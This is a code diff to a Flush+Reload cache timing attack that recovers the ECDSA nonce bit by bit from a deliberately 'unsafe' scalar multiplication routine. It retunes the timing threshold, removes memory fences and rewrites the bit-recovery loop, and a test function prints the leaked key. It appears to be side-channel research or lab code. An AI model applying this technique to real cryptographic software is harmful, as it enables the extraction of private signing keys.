@@ -53,25 +53,23 @@ unsigned long long int get_FlushReload_time()
 	reload_time /=count;
 	flush_time/=count;
 	printf("reload:%llu,flush:%llu\n",reload_time,flush_time);
-	return (reload_time+flush_time)/2;
+	return (reload_time*2+flush_time)/3;
 }
 bool __attribute((always_inline)) flush_reload(void* addr)
 {
     unsigned long long int start,end;
-	asm volatile("mfence");
     start = rdtsc();
 	maceess(addr);
 	end = rdtsc();
-	asm volatile("mfence");
     flush(addr);
-        printf("%llu\n",end-start);
+    printf("%llu\n",end-start);
     if((end-start)<flush_reload_threshold)
     {
         return 1;
     }
     return 0;
 }
-
+int numberaddr;void* addr = &numberaddr;
 void unsafe_sign::Ecdsa_sign_gen(const char* m)
 {
 	mpz_t k, E, dr, k_;
@@ -82,8 +80,9 @@ void unsafe_sign::Ecdsa_sign_gen(const char* m)
 	unsafe_ellpoint q;
 	do{	
 		get_random(k);
-	
-		mpz_printf(k);
+		//mpz_set_str(k,"ffff ffff ffff ffff ffff ffff ffff ffff 0000 0000 0000 0000 0000 0000 0000 0000",16);
+		 // mpz_set_str(k,"ffff 0000 0000 0000 ffff 0000 ffff 0000 ffff 0000 ffff 0000 ffff 0000 ffff eeee",16);
+		//mpz_printf(k);
 		q.unsafe_MulP(k,&P);
 		
 		mpz_set(r, q.x);
@@ -107,8 +106,12 @@ void unsafe_sign::Ecdsa_sign_gen(const char* m)
 	mpz_clear(E);
 }
 void unsafe_ellpoint::unsafe_MulP(mpz_t k,EllPoint* op)
-{
+{	
+	addr = addr_Padd;
+	unsigned long long int start;
+	unsigned long long int end;
 	EllPoint inf;
+	mpz_printf(k);
 	int size = mpz_sizeinbase(k, 2);
 	printf("%d",size);
 	for (int i = size - 1; i >= 0; i--)
@@ -116,20 +119,27 @@ void unsafe_ellpoint::unsafe_MulP(mpz_t k,EllPoint* op)
 		inf.Pdouble(&inf);
 		if (mpz_tstbit(k, i))
 		{
-			flush((void*)addr_Padd);
 			inf.Add(&inf, op);
-			if(flush_reload(addr_Padd))
-			{
-				printf("1 ");
-				key[size -1-i]='1';
-			}
-			else
-			{
-				printf("0 ");
-				key[size -1-i]='0';
-			}
-			flush((void*)addr_Padd);
+			maceess(addr);
+			flush((void*)addr);
 		}
+		start = rdtsc();
+		maceess(addr);
+		end = rdtsc();
+    	flush(addr);
+		//bool a = flush_reload(addr_Padd);
+		//printf("%llu\n",end-start);
+		if((end-start)<flush_reload_threshold)
+    	{
+        	//rintf("1 ");
+			key[size- 1-i]='0';
+    	}
+		else
+		{
+			//printf("0 ");
+			key[size- 1-i]='1';
+		}
+		//flush((void*)addr_Padd);
 	}
 	key[size] = 0;
 	Setp(&inf);
@@ -142,7 +152,7 @@ void Spytest()
 	unsafe_sign Sign;
 	Sign.Ecdsa_sign_gen(Message);
 
-	printf("\n%s\n",key);
+	printf("\nstr:%s\n",key);
 	mpz_t mpz_key;
 	mpz_init_set_str(mpz_key,key,2);
 	mpz_printf(mpz_key);
